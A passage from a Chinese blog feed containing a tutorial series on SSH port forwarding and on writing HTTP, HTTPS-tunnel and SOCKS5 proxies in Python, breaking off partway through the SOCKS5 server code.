    <content type="html"><![CDATA[<p>其实 ssh 不算是代理，只是一种能实现代理的工具，不过因为 ssh 功能强大，所以单独拿出来说一下。</p><h3 id="0x01-本地端口转发"><a href="#0x01-本地端口转发" class="headerlink" title="0x01 本地端口转发"></a>0x01 本地端口转发</h3><p>举个例子，远程有个 mongo 服务器需要连接，但是 mongo 不允许远程连接，只能通过和它同一个局域网的跳板机 A （x.x.x.x）连接。这个时候可以通过端口转发的方法直接连接。<br>命令格式是：<br><figure class="highlight plain"><figcaption><span>-L <local port="">:<remote host="">:<remote port=""> <ssh hostname="">```</ssh></remote></remote></local></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例如本地开启了 8000 端口监听， mongo 服务器地址为 192.168.0.2 端口  27017, 跳板机地址 192.168.0.1：</span><br><span class="line">``` ssh -N -L 8000:192.168.0.2:27017  192.168.0.1</span><br></pre></td></tr></table></figure></p><p>开启完端口转发后，连接 mongo 可以直接通过命令 mongo –host localhost –port 8000<br><a id="more"></a></p><h3 id="0x02-远程端口转发"><a href="#0x02-远程端口转发" class="headerlink" title="0x02 远程端口转发"></a>0x02 远程端口转发</h3><p>远程端口转发和本地端口转发功能一样，唯一的区别在于 ssh client 端和 server 端相反。举上面的例子，本地 client 无法通过 ssh 连接 A, 但是 A 能 ssh 连接本地。这种情况下可以通过远程端口转发<br>命令格式：<br><figure class="highlight plain"><figcaption><span>-R <local port="">:<remote host="">:<remote port=""> <ssh hostname=""></ssh></remote></remote></local></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">上例可以在本地运行</span><br><span class="line">``` ssh -R 8000:192.168.0.2:27017  192.168.0.1</span><br></pre></td></tr></table></figure></p><h3 id="0x03-动态转发"><a href="#0x03-动态转发" class="headerlink" title="0x03 动态转发"></a>0x03 动态转发</h3><p>动态端口允许通过配置一个本地端口，把通过隧道的数据转发到远端的所有地址。本地的应用程序需要使用 Socks 协议与本地端口通讯。此时 SSH 充当 Socks 代理服务器的角色。</p><p><img src="/media/15032247248211.jpg" alt=""></p><p>简单的说就是和 ss 功能一样，只是中间的加密有 openssl 来做。</p><p>命令如下<br><figure class="highlight plain"><figcaption><span>-D <local port=""> <ssh server="">```</ssh></local></span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">上面的例子可以如下设置</span><br><span class="line">``` ssh -f -N -D 10.1.1.1:8000 B@192.168.0.1</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实 ssh 不算是代理，只是一种能实现代理的工具，不过因为 ssh 功能强大，所以单独拿出来说一下。&lt;/p&gt;
&lt;h3 id=&quot;0x01-本地端口转发&quot;&gt;&lt;a href=&quot;#0x01-本地端口转发&quot; class=&quot;headerlink&quot; title=&quot;0x01 本地端口转发&quot;&gt;&lt;/a&gt;0x01 本地端口转发&lt;/h3&gt;&lt;p&gt;举个例子，远程有个 mongo 服务器需要连接，但是 mongo 不允许远程连接，只能通过和它同一个局域网的跳板机 A （x.x.x.x）连接。这个时候可以通过端口转发的方法直接连接。&lt;br&gt;命令格式是：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;figcaption&gt;&lt;span&gt;-L &lt;local port=&quot;&quot;&gt;:&lt;remote host=&quot;&quot;&gt;:&lt;remote port=&quot;&quot;&gt; &lt;ssh hostname=&quot;&quot;&gt;```&lt;/ssh&gt;&lt;/remote&gt;&lt;/remote&gt;&lt;/local&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;例如本地开启了 8000 端口监听， mongo 服务器地址为 192.168.0.2 端口  27017, 跳板机地址 192.168.0.1：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;``` ssh -N -L 8000:192.168.0.2:27017  192.168.0.1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;开启完端口转发后，连接 mongo 可以直接通过命令 mongo –host localhost –port 8000&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(7)-https-代理.md</title>
    <link href="http://yousite.com/2017/08/20/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-7-http-%E4%BB%A3%E7%90%86-md/"/>
    <id>http://yousite.com/2017/08/20/由浅入深写代理-7-http-代理-md/</id>
    <published>2017-08-20T08:36:06.000Z</published>
    <updated>2018-01-27T14:48:02.965Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要实现隧道代理，让 https 请求也能代理。</p><p>隧道代理的原理是：<br><code>HTTP 客户端通过 CONNECT 方法请求隧道代理创建一条到达任意目的服务器和端口的 TCP 连接，并对客户端和服务器之间的后继数据进行盲转发。</code></p><a id="more"></a><p><img src="/media/15032206534564.jpg" alt=""></p><p>步骤如下</p><ol><li><p>客户端发送一个 http CONNECT 请求<br><code>CONNECT baidu.com:443 HTTP/1.1</code></p></li><li><p>代理收到这样的请求后，拿到目标服务器域名及端口，与目标服务端建立 TCP 连接，并响应给浏览器这样一个 HTTP 报文：<br> <code>HTTP/1.1 200 Connection Established</code></p></li><li>建立完隧道以后，客户端与目标服务器照之前的方式发送请求，代理节点只是做转发功能，无从知道转发的流量具体是什么    </li></ol><p>看代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(self, sock, data)</span>:</span></span><br><span class="line">        print(data)</span><br><span class="line">        bytes_sent = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            r = sock.send(data[bytes_sent:])</span><br><span class="line">            <span class="keyword">if</span> r &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> r</span><br><span class="line">            bytes_sent += r</span><br><span class="line">            <span class="keyword">if</span> bytes_sent == len(data):</span><br><span class="line">                <span class="keyword">return</span> bytes_sent</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle_tcp</span><span class="params">(self, sock, remote)</span>:</span></span><br><span class="line">        <span class="comment"># 处理 client socket 和 remote socket 的数据流</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fdset = [sock, remote]</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">                <span class="comment"># 用 IO 多路复用 select 监听套接字是否有数据流</span></span><br><span class="line">                r, w, e = select.select(fdset, [], [])</span><br><span class="line">                <span class="keyword">if</span> sock <span class="keyword">in</span> r:</span><br><span class="line">                    data = sock.recv(<span class="number">4096</span>)</span><br><span class="line">                    <span class="keyword">if</span> len(data) &lt;= <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    result = self.send_data(remote, data)</span><br><span class="line">                    <span class="keyword">if</span> result &lt; len(data):</span><br><span class="line">                        <span class="keyword">raise</span> Exception(<span class="string">'failed to send all data'</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> remote <span class="keyword">in</span> r:</span><br><span class="line">                    data = remote.recv(<span class="number">4096</span>)</span><br><span class="line">                    <span class="keyword">if</span> len(data) &lt;= <span class="number">0</span>:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    result = self.send_data(sock, data)</span><br><span class="line">                    <span class="keyword">if</span> result &lt; len(data):</span><br><span class="line">                        <span class="keyword">raise</span> Exception(<span class="string">'failed to send all data'</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span>(e)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            sock.close()</span><br><span class="line">            remote.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_CONNECT</span><span class="params">(self)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解析出 host 和 port</span></span><br><span class="line">        uri = self.path.split(<span class="string">":"</span>)</span><br><span class="line">        host, port = uri[<span class="number">0</span>], int(uri[<span class="number">1</span>])</span><br><span class="line">        host_ip = socket.gethostbyname(host)</span><br><span class="line"></span><br><span class="line">        remote_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        remote_sock.connect((host_ip, port))</span><br><span class="line">        <span class="comment"># 告诉客户端 CONNECT 成功</span></span><br><span class="line">        self.wfile.write(<span class="string">"&#123;protocol_version&#125; 200 Connection Established\r\n\r\n"</span>.format(protocol_version=self.protocol_version).encode())</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 转发请求</span></span><br><span class="line">        self.handle_tcp(self.connection, remote_sock)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server = HTTPServer((<span class="string">''</span>, <span class="number">8888</span>), ProxyHandler)</span><br><span class="line">        server.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        server.socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>有一个 <code>do_CONNECT</code> 函数的处理，实现之前隧道的建立，然后 <code>handle_tcp</code> ，代码和之前 socks5 代理是一样的。</p><p>参考链接：</p><ul><li><a href="https://imququ.com/post/web-proxy.html" target="_blank" rel="noopener">https://imququ.com/post/web-proxy.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要实现隧道代理，让 https 请求也能代理。&lt;/p&gt;
&lt;p&gt;隧道代理的原理是：&lt;br&gt;&lt;code&gt;HTTP 客户端通过 CONNECT 方法请求隧道代理创建一条到达任意目的服务器和端口的 TCP 连接，并对客户端和服务器之间的后继数据进行盲转发。&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(6)-http-代理.md</title>
    <link href="http://yousite.com/2017/08/20/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-6-http-%E4%BB%A3%E7%90%86-md/"/>
    <id>http://yousite.com/2017/08/20/由浅入深写代理-6-http-代理-md/</id>
    <published>2017-08-20T07:26:36.000Z</published>
    <updated>2018-01-27T14:47:50.052Z</updated>
    
    <content type="html"><![CDATA[<p>本文讲 http 代理，顾名思义，http 代理代理的是 http 请求，其实这里面分两类</p><pre><code>* 普通代理 这种代理扮演的是「中间人」角色，对于连接到它的客户端来说，它是服务端；对于要连接的服务端来说，它是客户端。它就负责在两端之间来回传送 HTTP 报文。* 隧道代理。它通过 HTTP 协议正文部分（Body）完成通讯，以 HTTP 的方式实现任意基于 TCP 的应用层协议代理。这种代理使用 HTTP 的 CONNECT 方法建立连接。</code></pre><a id="more"></a><p>通俗一点讲，普通代理解析 http 包，然后将请求转发到目标地址，但是没法解析 https 的包，所以也就没法代理 https 的请求，但是隧道代理可以代理 https 的请求或者其他的一些协议请求。</p><h3 id="0x01-普通代理"><a href="#0x01-普通代理" class="headerlink" title="0x01 普通代理"></a>0x01 普通代理</h3><p>代码很简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyHandler</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recv_data_from_remote</span><span class="params">(self, sock)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            recv_data = sock.recv(<span class="number">4096</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> recv_data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += recv_data</span><br><span class="line">        sock.close()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 解析 GET 请求信息</span></span><br><span class="line">        uri = urlparse(self.path)</span><br><span class="line">        scheme, host, path = uri.scheme, uri.hostname, uri.path</span><br><span class="line">        host_ip = socket.gethostbyname(host)</span><br><span class="line">        port = <span class="number">443</span> <span class="keyword">if</span> scheme == <span class="string">"https"</span> <span class="keyword">else</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 为了简单起见，Connection 都为 close, 也就不需要 Proxy-Connection 判断了</span></span><br><span class="line">        <span class="keyword">del</span> self.headers[<span class="string">'Proxy-Connection'</span>]</span><br><span class="line">        self.headers[<span class="string">'Connection'</span>] = <span class="string">'close'</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 构造新的 http 请求</span></span><br><span class="line">        send_data = <span class="string">"GET &#123;path&#125; &#123;protocol_version&#125;\r\n"</span>.format(path=path, protocol_version=self.protocol_version)</span><br><span class="line">        headers = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> self.headers.items():</span><br><span class="line">            headers += <span class="string">"&#123;key&#125;: &#123;value&#125;\r\n"</span>.format(key=key, value=value)</span><br><span class="line">        headers += <span class="string">'\r\n'</span></span><br><span class="line">        send_data += headers</span><br><span class="line"></span><br><span class="line">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.connect((host_ip, port))</span><br><span class="line">        <span class="comment"># 发送请求到目标地址</span></span><br><span class="line">        sock.sendall(send_data.encode())</span><br><span class="line">        data = self._recv_data_from_remote(sock)</span><br><span class="line"></span><br><span class="line">        self.wfile.write(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server = HTTPServer((<span class="string">''</span>, <span class="number">8888</span>), ProxyHandler)</span><br><span class="line">        server.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        server.socket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这里面就实现了 get 请求的转发，只用单线程的方式来处理，其他的有兴趣的同学可以自己扩展下。<br>看下效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 http_server.py</span><br></pre></td></tr></table></figure><p><img src="/media/15032177986462.jpg" alt=""></p><p>配置完代理后可以发现 http 的请求都能正常转发，但是 https 的都没法识别。</p><p>下篇教程看如何通过隧道代理解决这个问题。</p><p>参考资料</p><pre><code>* https://imququ.com/post/web-proxy.html* http://www.lyyyuna.com/2016/01/16/http-proxy-get1/</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文讲 http 代理，顾名思义，http 代理代理的是 http 请求，其实这里面分两类&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;* 普通代理 这种代理扮演的是「中间人」角色，对于连接到它的客户端来说，它是服务端；对于要连接的服务端来说，它是客户端。它就负责在两端之间来回传送 HTTP 报文。
* 隧道代理。它通过 HTTP 协议正文部分（Body）完成通讯，以 HTTP 的方式实现任意基于 TCP 的应用层协议代理。这种代理使用 HTTP 的 CONNECT 方法建立连接。
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(5)-socks5-代理.md</title>
    <link href="http://yousite.com/2017/08/20/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-5-socks5-%E4%BB%A3%E7%90%86-md/"/>
    <id>http://yousite.com/2017/08/20/由浅入深写代理-5-socks5-代理-md/</id>
    <published>2017-08-20T06:39:30.000Z</published>
    <updated>2018-01-27T14:48:27.065Z</updated>
    
    <content type="html"><![CDATA[<p>既然 socks5 是协议，所以客户端也必须有 socks5 的实现才能和服务端连接。这里面我就用现成的开源库 <a href="https://github.com/Anorov/PySocks" target="_blank" rel="noopener">PySocks</a> 来演示下。</p><p>pySocks 有两种方式来实现，一种是直接的 <code>s = socks.socksocket()</code> 创建一个新的 socket 对象，还有一种是 Monkeypatching，算是 python 的黑魔法。</p><a id="more"></a><p>我们用第一种方法试下<br>首先把代理服务器开起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 socks5_server.py</span><br></pre></td></tr></table></figure><p>然后运行如下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socks</span><br><span class="line">s = socks.socksocket() <span class="comment"># Same API as socket.socket in the standard lib</span></span><br><span class="line">s.set_proxy(socks.SOCKS5, <span class="string">"localhost"</span>, <span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">"www.weibo.com"</span>, <span class="number">80</span>))</span><br><span class="line">s.sendall(<span class="string">"GET / HTTP/1.1 /r/n/r/n"</span>)</span><br><span class="line"><span class="keyword">print</span> s.recv(<span class="number">4096</span>)</span><br></pre></td></tr></table></figure><p>返回值如下<br><img src="/media/15032136331944.jpg" alt=""></p><p>由于没有设置 http 正确的 header，所以 weibo 服务器返回了 400</p><p>当然你可以直接用 chrome 的 代理插件设置如下</p><p><img src="/media/15032137273241.jpg" alt=""></p><p>可以看到所有的请求都经过 socks5 服务器了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;既然 socks5 是协议，所以客户端也必须有 socks5 的实现才能和服务端连接。这里面我就用现成的开源库 &lt;a href=&quot;https://github.com/Anorov/PySocks&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PySocks&lt;/a&gt; 来演示下。&lt;/p&gt;
&lt;p&gt;pySocks 有两种方式来实现，一种是直接的 &lt;code&gt;s = socks.socksocket()&lt;/code&gt; 创建一个新的 socket 对象，还有一种是 Monkeypatching，算是 python 的黑魔法。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>由浅入深写代理(4)-socks5-代理.md</title>
    <link href="http://yousite.com/2017/08/20/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E5%86%99%E4%BB%A3%E7%90%86-4-socks5-%E4%BB%A3%E7%90%86-md/"/>
    <id>http://yousite.com/2017/08/20/由浅入深写代理-4-socks5-代理-md/</id>
    <published>2017-08-20T06:06:55.000Z</published>
    <updated>2018-01-27T14:59:34.511Z</updated>
    
    <content type="html"><![CDATA[<p>接下来我们用 python 写下 socks5 服务端的实现</p><a id="more"></a><h3 id="0x03-socks5-实现"><a href="#0x03-socks5-实现" class="headerlink" title="0x03 socks5 实现"></a>0x03 socks5 实现</h3><p>先看下整体代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_data</span><span class="params">(sock, data)</span>:</span></span><br><span class="line">    print(data)</span><br><span class="line">    bytes_sent = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        r = sock.send(data[bytes_sent:])</span><br><span class="line">        <span class="keyword">if</span> r &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> r</span><br><span class="line">        bytes_sent += r</span><br><span class="line">        <span class="keyword">if</span> bytes_sent == len(data):</span><br><span class="line">            <span class="keyword">return</span> bytes_sent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_tcp</span><span class="params">(sock, remote)</span>:</span></span><br><span class="line">    <span class="comment"># 处理 client socket 和 remote socket 的数据流</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        fdset = [sock, remote]</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            <span class="comment"># 用 IO 多路复用 select 监听套接字是否有数据流</span></span><br><span class="line">            r, w, e = select.select(fdset, [], [])</span><br><span class="line">            <span class="keyword">if</span> sock <span class="keyword">in</span> r:</span><br><span class="line">                data = sock.recv(<span class="number">4096</span>)</span><br><span class="line">                <span class="keyword">if</span> len(data) &lt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                result = send_data(remote, data)</span><br><span class="line">                <span class="keyword">if</span> result &lt; len(data):</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">'failed to send all data'</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> remote <span class="keyword">in</span> r:</span><br><span class="line">                data = remote.recv(<span class="number">4096</span>)</span><br><span class="line">                <span class="keyword">if</span> len(data) &lt;= <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                result = send_data(sock, data)</span><br><span class="line">                <span class="keyword">if</span> result &lt; len(data):</span><br><span class="line">                    <span class="keyword">raise</span> Exception(<span class="string">'failed to send all data'</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span>(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        sock.close()</span><br><span class="line">        remote.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle_con</span><span class="params">(sock, addr)</span>:</span></span><br><span class="line">    <span class="comment"># 接受客户端来的请求，socks5 的 认证和连接过程</span></span><br><span class="line"></span><br><span class="line">    sock.recv(<span class="number">256</span>)</span><br><span class="line">    <span class="comment"># 无需进一步认证信息</span></span><br><span class="line">    sock.send(<span class="string">b"\x05\x00"</span>)</span><br><span class="line">    data = sock.recv(<span class="number">4</span>) <span class="keyword">or</span> <span class="string">'\x00'</span> * <span class="number">4</span></span><br><span class="line">    <span class="comment"># CMD 为 0x01 也就是 CONNECT 继续</span></span><br><span class="line">    mode = data[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> mode != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># DST.ADDR 有三种形式，分别做判断</span></span><br><span class="line">    addr_type = data[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">if</span> 